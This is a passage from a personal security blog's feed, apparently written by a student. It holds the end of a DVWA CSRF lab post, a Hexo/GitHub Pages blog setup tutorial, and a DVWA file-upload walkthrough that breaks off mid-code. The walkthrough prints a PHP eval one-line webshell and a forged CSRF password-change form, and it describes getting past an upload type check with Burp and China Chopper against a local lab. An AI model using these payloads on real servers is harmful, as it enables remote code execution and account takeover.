action=&quot;http://127.0.0.1/dvwa/vulnerabilities/csrf/&quot;&gt;</span><br><span class="line">&lt;input type=&quot;hidden&quot; name=&quot;password_new&quot; value=&quot;password&quot;&gt;</span><br><span class="line">&lt;input type=&quot;hidden&quot; name=&quot;password_conf&quot; value=&quot;password&quot;&gt;</span><br><span class="line">&lt;input type=&quot;hidden&quot; name=&quot;user_token&quot; value=&quot;&quot;&gt;</span><br><span class="line">&lt;input type=&quot;hidden&quot; name=&quot;Change&quot; value=&quot;Change&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>然后在浏览器输入攻击页面url，跳转到修改密码的页面</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-CSRF/10.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>可以看到成功获取token值并修改密码成功</p>]]></content>
    
    <summary type="html">
    
      dvwa-CSRF
    
    </summary>
    
      <category term="dvwa-CSRF" scheme="https://Foxgrin.github.io/categories/dvwa-CSRF/"/>
    
    
      <category term="CSRF" scheme="https://Foxgrin.github.io/tags/CSRF/"/>
    
  </entry>
  
  <entry>
    <title>使用Hexo+github搭建属于自己的博客</title>
    <link href="https://Foxgrin.github.io//posts/29757/"/>
    <id>https://Foxgrin.github.io//posts/29757/</id>
    <published>2018-07-12T11:53:00.000Z</published>
    <updated>2018-07-12T15:12:14.980Z</updated>
    
    <content type="html"><![CDATA[<p>几个月以前，刚刚入门安全，看到了学长的博客，心里想着自己怎么这么low，还在用word记笔记，就一直想要有一个属于自己的博客，奈何时间有限，就一直把这个想法拖后，现在总算是迎来了假期，就下定了决心一定要做一个自己的博客，中间也碰到了无数的坑，无数次想放弃，但是最终在学长的耐心帮助下和不断的上网查询，总算是在今天搭完了自己的博客，并且把之前的笔记上传上来了，现在将我制作过程和碰到的问题及解决方案分享出来<a id="more"></a></p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在搭建博客之前，还想再多说几句，为什么要搭建自己的博客，在学习过程记笔记是很多人都有的习惯，记笔记的同时也是在整理复习自己学到的东西，实际上就是一个在给别人讲解的过程，很多东西表面上是学到了，但是过几天可能又忘了，记笔记不仅能把学到的总结一遍，在后面忘了的时候也可以再翻出来看，而在一开始的学习过程，我都是用word的形式记笔记，一方面这很low，一方面后面查看很不方便，而博客就很好的解决了这个问题，我们既可以按照自己的想法制作一个高大上的酷炫页面，也可以将自己的文章分类分标签和归档，日后查看明显就方便了很多，而且浏览效果也明显比word好很多，而且学长说过，在将来面试过程中，有一个自己的博客，也可以给自己加分。好了，废话不多说啦，下面马上将我制作博客的过程分享出来~</p><h2 id="开启github-pages"><a href="#开启github-pages" class="headerlink" title="开启github pages"></a>开启github pages</h2><p>首先我们先注册一个github账号，登录后新建一个仓库</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Hexo/1.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>然后填写仓库的名称和描述，这里一定要注意仓库的名称的格式：你的用户名.github.io</p><p>描述属于可选项，填完点击创建仓库即可</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Hexo/2.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>然后点击Settings设置</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Hexo/3.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>然后往下拉，找到github pages，点击choose a theme选择主题</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Hexo/4.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>选择一款自己喜欢的主题（PS：这个可以先随便选，后面还可以更改）</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Hexo/5.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>这样，博客首页就做好了</p><p>可以先访问一下自己的博客，在浏览器输入 用户名.github.io访问</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Hexo/6.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h2 id="hexo环境搭建"><a href="#hexo环境搭建" class="headerlink" title="hexo环境搭建"></a>hexo环境搭建</h2><p>接下来就是用hexo丰富我们的博客主题</p><p>首先先安装<a href="https://git-scm.com/download" target="_blank" rel="noopener">git</a></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Hexo/7.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>再安装<a href="http://nodejs.org/" target="_blank" rel="noopener">nodejs</a></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Hexo/8.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>两个安装都默认下一步就可以了</p><p>安装完成后，创建一个存放hexo组件的目录，我以blog目录为例说明，这个目录就是之后操作博客的目录</p><p>然后右键选择git bash here</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Hexo/9.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>然后在命令行中输入npm install hexo -g ，开始安装Hexo</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Hexo/10.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>输入hexo -v，检查hexo是否安装成功</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Hexo/11.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>输入hexo init，初始化文件夹，这里有点慢，可能要耐心等待</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Hexo/12.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>完成后显示Start blogging with Hexo这串提示就说明安装成功啦</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Hexo/13.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>输入npm install，安装所需要的组件</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Hexo/14.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>再将Hexo于Github page 联系起来，设置Git的user name 和email</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Hexo/15.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>上图中双引号中的内容替换成自己的用户名和邮箱</p><p>然后回到我们创建的存放博客的目录，这时候就发现多了许多目录和文件，在其中找到并打开_config.yml配置文件</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Hexo/16.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>来到配置文件的最下方</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Hexo/17.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>其中theme是主题的名字，这个我们后面在修改，首先修改#Deployment里面的内容，修改结果为：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Hexo/18.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>上图应注意冒号后有一个空格</p><p>修改完成后保存</p><p>使用hexo s在本地4000端口开启服务（PS：这个命令很重要，一定要记住，之后我们修改博客都可以用这个命令先预览修改后的博客页面，之后再将改动更新到github上）</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Hexo/19.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>在浏览器输入127.0.0.1:4000访问博客主页</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Hexo/20.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>看到上图的页面就说明我们的环境已经基本准备好了</p><h2 id="使用Hexo修改博客主题"><a href="#使用Hexo修改博客主题" class="headerlink" title="使用Hexo修改博客主题"></a>使用Hexo修改博客主题</h2><p>经过上面的各种环境搭建，我们的博客可算是基本成形了，接下来就是对博客进行装修，选择一个我们喜欢的主题</p><p>我们可以在hexo官方上选择我们喜欢的主题（PS：<a href="https://hexo.io/themes/" target="_blank" rel="noopener">选择博客主题链接</a>）</p><p>选择自己喜欢的主题后点击主题名进入发布人的github</p><p>这里以我的博客选择的主题为例</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Hexo/21.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Hexo/22.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>复制主题链接</p><p>然后回到blog目录下，找到并进入theme文件夹</p><p>右键选择git bash here</p><p>输入git clone +你选择的主题链接</p><p>下载所选主题</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Hexo/23.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>然后可以将主题文件夹名修改成较为简便好记的名字，这里修改成tomotoes</p><p>然后在blog目录下的_config.yml配置文件中，也就是刚才说的theme配置</p><p>修改成所选的主题名</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Hexo/24.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>然后在blog目录下打开git输入hexo s，本地预览效果</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Hexo/25.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>可见虽然主题更换了，但是一些css和js特效并没有显示出来，可能是这个主题需要特殊的一些配置文件，这时候我们就需要进入设计者的github主页中寻找接下来需要的设置</p><h2 id="修改主题配置"><a href="#修改主题配置" class="headerlink" title="修改主题配置"></a>修改主题配置</h2><p>我们来到设计者的github页面，在主题下载链接下方会发现一个主题配置的要求</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Hexo/26.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>接下来就要仔细阅读这些要求，这里还是以我的主题为例</p><p>在Readme.md文件中有一些主题脚本或者css显示所需的配置安装</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Hexo/27.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>按照上面的配置命令逐一安装，这里就不一一说明了</p><p>安装完成后再次运行hexo s</p><p>再来看看页面</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Hexo/28.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>可以看出脚本效果都成功的加载出来了，接下来就是根据需求修改主题的配置了</p><p>首先我们还是来到blog文件夹下的_config.yml配置文件</p><p>在一开始的地方，我们可以修改一些博客的基本信息</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Hexo/29.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>各个配置说明如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">title: your title</span><br><span class="line">subtitle: your subtitle</span><br><span class="line">description: your description</span><br><span class="line">keywords: your keywords</span><br><span class="line">author: your name</span><br><span class="line">email: your email</span><br><span class="line">url: your site url</span><br></pre></td></tr></table></figure><p>修改完成后，就可以修改我们下载的主题的配置文件了，同样在所选主题文件夹里找到_config.yml配置文件</p><p>这里可以根据官网上的说明修改，也不一一说明了</p><p>修改完成后，我们博客的基本布局信息都已经完成了</p><h2 id="上传文章"><a href="#上传文章" class="headerlink" title="上传文章"></a>上传文章</h2><p>接下来我们就可以尝试上传文章了</p><p>这里需要注意的是我们所有上传的文章都要放在/blog/source/_posts目录下，且文章的格式都必须是md</p><p>下面是我上传的文章：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Hexo/30.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>再简单的总结一下一些常用的md文件的格式：</p><p>(1)文件开头：</p><figure class="highlight md"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">title: xxx</span><br><span class="line">tags: xxx</span><br><span class="line">categories: xxx</span><br><span class="line">description: xxx</span><br><span class="line">date: 2018/7/12 22:00:00</span><br><span class="line">---</span><br></pre></td></tr></table></figure><p>(2)文章摘要：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xxx&lt;!--more--&gt;</span><br></pre></td></tr></table></figure><p>(3)图片插入：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">![](/img/1.png)</span><br></pre></td></tr></table></figure><p>（PS：在/blog/source目录下创建img文件夹，以后上传到文章的图片都保存在这里面）</p><p>(4)http链接插入：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[内容](https://)</span><br></pre></td></tr></table></figure><p>(5)代码区：三个`</p><p>(6)标题设置：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># 一阶标题 </span><br><span class="line"></span><br><span class="line">##二阶标题 </span><br><span class="line"></span><br><span class="line">###三阶标题 </span><br><span class="line"></span><br><span class="line">####四阶标题 </span><br><span class="line"></span><br><span class="line">#####五阶标题 </span><br><span class="line"></span><br><span class="line">######六阶标题</span><br></pre></td></tr></table></figure><p>这里md文件的编写，我强烈推荐使用Typora编辑器</p><p>最后，一切改动完成后，在blog目录下打开git，输入hexo d –g命令将改动更新到github上即可</p><h2 id="问题及解决方法"><a href="#问题及解决方法" class="headerlink" title="问题及解决方法"></a>问题及解决方法</h2><p>(1)输入hexo d –g 提示找不到git</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Hexo/31.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>解决方法：输入npm install –save hexo-deployer-git </p><p>(2)点击主页或者归档显示找不到页面</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Hexo/32.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>解决方法：</p><p>1)开启标签页：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new page tags</span><br></pre></td></tr></table></figure><p>执行完成会发现/blog/source下面多了tags文件夹，里面有一个index.md文件，在文件头内容中添加：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">layout: tags</span><br><span class="line">comments: false</span><br></pre></td></tr></table></figure><p>2)开启分类页</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new page categories</span><br></pre></td></tr></table></figure><p>在index.md文件头内容中添加：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">layout: categories</span><br><span class="line">comments: false</span><br></pre></td></tr></table></figure><p>3)开启关于页</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new page about</span><br></pre></td></tr></table></figure><p>在index.md文件头内容中添加：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">layout: about</span><br><span class="line">comments: true</span><br><span class="line">reward: false</span><br></pre></td></tr></table></figure><p>PS：可能不同主题的配置命令不一样，具体参考主题官网</p><p>(3)关于设置文章唯一链接abbrlink，注意编写md文件时一定要确保未开启hexo s命令，否则会导致保存md文件后自动生成新的md文件，原来的内容全部都会消失</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p>到这里博客就基本全部搭建完毕了，最后附上几个搭建的参考链接：</p><p>(1)<a href="https://mochazz.github.io/2017/07/26/hexo-build/" target="_blank" rel="noopener">https://mochazz.github.io/2017/07/26/hexo-build/</a></p><p>(2)<a href="http://www.cnblogs.com/fengxiongZz/p/7707568.html" target="_blank" rel="noopener">http://www.cnblogs.com/fengxiongZz/p/7707568.html</a></p><p>(3)Typora使用参考手册:<a href="https://blog.csdn.net/SIMBA1949/article/details/79001226" target="_blank" rel="noopener">https://blog.csdn.net/SIMBA1949/article/details/79001226</a></p>]]></content>
    
    <summary type="html">
    
      Hexo
    
    </summary>
    
      <category term="Hexo" scheme="https://Foxgrin.github.io/categories/Hexo/"/>
    
    
      <category term="Hexo" scheme="https://Foxgrin.github.io/tags/Hexo/"/>
    
  </entry>
  
  <entry>
    <title>dvwa-file upload</title>
    <link href="https://Foxgrin.github.io//posts/40994/"/>
    <id>https://Foxgrin.github.io//posts/40994/</id>
    <published>2018-07-12T08:27:00.000Z</published>
    <updated>2018-07-12T11:00:13.099Z</updated>
    
    <content type="html"><![CDATA[<p>总结了dvwa中的文件上传漏洞关卡<a id="more"></a></p><h2 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h2><p>代码复现如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if(isset($_POST[&apos;upload&apos;]))&#123;</span><br><span class="line">$target_path=&quot;C:/phpStudy/PHPTutorial/WWW/demo/file-upload/uploaded/&quot;;</span><br><span class="line">$target_path .= basename($_FILES[&apos;file&apos;][&apos;name&apos;]);</span><br><span class="line">if(!move_uploaded_file($_FILES[&apos;file&apos;][&apos;tmp_name&apos;],$target_path))&#123;</span><br><span class="line">echo &apos;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&apos;;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">echo &quot;&lt;pre&gt;&#123;$target_path&#125; succesfully uploaded!&lt;/pre&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>这部分内容涉及文件上传，我们先认识一下如何上传一个文件到服务器</p><p>表单标签部分：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">""</span> <span class="attr">method</span>=<span class="string">"post"</span> <span class="attr">enctype</span>=<span class="string">"multipart/form-data"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>Choose an image to upload:<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"file"</span> <span class="attr">name</span>=<span class="string">"file"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">name</span>=<span class="string">"upload"</span> <span class="attr">value</span>=<span class="string">"upload"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这里特别注意的是form标签中的entype属性规定了提交表单后如何对提交的数据进行编码，在表单需要提交二进制数据时，比如文件内容，要使用“multipart/form-data” </p><p>同时这里用了一个全局变量$_FILES</p><p>举个例子说明用法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if(isset($_POST[&apos;upload&apos;]))&#123;</span><br><span class="line">    echo &apos;name:&apos;.$_FILES[&apos;file&apos;][&apos;name&apos;].&apos;&lt;br&gt;&apos;;</span><br><span class="line">    echo &apos;type:&apos;.$_FILES[&apos;file&apos;][&apos;type&apos;].&apos;&lt;br&gt;&apos;;</span><br><span class="line">    echo &apos;tmp_name:&apos;.$_FILES[&apos;file&apos;][&apos;tmp_name&apos;].&apos;&lt;br&gt;&apos;;</span><br><span class="line">    echo &apos;size:&apos;.$_FILES[&apos;file&apos;][&apos;size&apos;].&apos;&lt;br&gt;&apos;;</span><br><span class="line">    echo basename($_FILES[&apos;file&apos;][&apos;name&apos;]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>这里需要注意服务器接受的POST参数是upload，全局变量$_FILES，代表了上传到服务器的文件信息 </p><p>其中<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">$_FILES[‘file‘][‘name’] : 代表上传文件的名称</span><br><span class="line"></span><br><span class="line">$_FILES[‘file’][‘size’] : 代表上传文件的大小</span><br><span class="line"></span><br><span class="line">$_FILES[‘file’][‘tmp_name’] : 代表上传的文件存储的临时路径</span><br><span class="line"></span><br><span class="line">$_FILES[‘file’][‘type’] : 代表上传文件的类型</span><br></pre></td></tr></table></figure></p><p>我们上传一个png文件试试 </p><p><img src="/img/dvwa-file-upload/1.png" alt=""></p><p>basename函数返回的是文件名，如果参数省略，则返回的文件名包含后缀 </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> basename($_FILES[<span class="string">'file'</span>][<span class="string">'name'</span>],<span class="string">'.png'</span>);</span><br></pre></td></tr></table></figure><p>如果过滤掉.png后缀名，则上传png文件是不会返回.png的后缀名 </p><p><img src="/img/dvwa-file-upload/2.png" alt=""></p><p>move_uploaded_file函数作用是将我们上传的文件从临时目录移动到指定目录下，成功返回true,失败则返回false </p><p>我们试着上传一个png文件 </p><p><img src="/img/dvwa-file-upload/3.png" alt=""></p><p>看出上传成功 </p><p><img src="/img/dvwa-file-upload/4.png" alt=""></p><p>由于这里对我们上传的文件没有任何的检查，过滤等操作，因此我们可以上传任意木马文件，得到webshell，这就是文件上传漏洞</p><p>我们上传一句话木马到服务器，文件名为test.php</p><p>一句话木马代码为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>($_POST[<span class="string">'apple'</span>]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-file-upload/5.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>打开中国菜刀 </p><p><img src="/img/dvwa-file-upload/6.png" alt=""></p><p>输入文件名所在地，然后POST的参数名称为apple</p><p>然后菜刀就会向服务器发送包含apple参数的POST请求，最终获得服务器的webshell权限</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-file-upload/7.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h2 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h2><p>代码复现如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if(isset($_POST[&apos;upload&apos;]))&#123;</span><br><span class="line">$name=$_FILES[&apos;file&apos;][&apos;name&apos;];</span><br><span class="line">$size=$_FILES[&apos;file&apos;][&apos;size&apos;];</span><br><span class="line">$type=$_FILES[&apos;file&apos;][&apos;type&apos;];</span><br><span class="line"></span><br><span class="line">if(($type == &quot;image/png&quot; || $type == &quot;image/jpeg&quot;) &amp;&amp; $size &lt; 100000)&#123;</span><br><span class="line">$target_path=&quot;C:/phpStudy/PHPTutorial/WWW/demo/file-upload/uploaded/&quot;;</span><br><span class="line">$target_path .= basename($name);</span><br><span class="line">if(!move_uploaded_file($_FILES[&apos;file&apos;][&apos;tmp_name&apos;],$target_path))&#123;</span><br><span class="line">echo &apos;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&apos;;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">echo &quot;&lt;pre&gt;&#123;$target_path&#125; succesfully uploaded!&lt;/pre&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">echo &apos;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&apos;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>这关对上传文件进行了一些过滤，可以看出只能上传jpg和png为后缀名的文件，并且文件大小不能超过100000B，因为我们上传的是一句话木马文件，所以不用担心文件大小超过限制，现在要考虑的是如何绕过后缀名的限制</p><p>我们先试着把一句话木马文件后缀名改为图片文件，然后上传</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-file-upload/8.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>可以看到上传成功</p><p>那么我们打开中国菜刀，看看能不能获得webshell</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-file-upload/9.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>获取webshell失败</p><p>可见图片文件是不行的，执行不了POST到服务器的命令</p><p>那么我们可以考虑用burp抓包，将文件名修改为test.php</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-file-upload/10.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-file-upload/11.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>可以看到我们上传的文件类型是png，是图片文件，符合条件上传成功，但是因为上传后图片就是png文件，所以菜刀POST到服务器的相关命令无法执行，所以我们要将上传成功后的文件名修改为php文件，这样就可以成功执行命令 </p><p><img src="/img/dvwa-file-upload/12.png" alt=""></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-file-upload/13.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>成功上传，再上菜刀 </p><p><img src="/img/dvwa-file-upload/14.png" alt=""></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-file-upload/15.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>成功获得webshell </p><h2 id="High"><a href="#High" class="headerlink" title="High"></a>High</h2><p>代码复现如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if(isset($_POST[&apos;upload&apos;]))&#123;</span><br><span 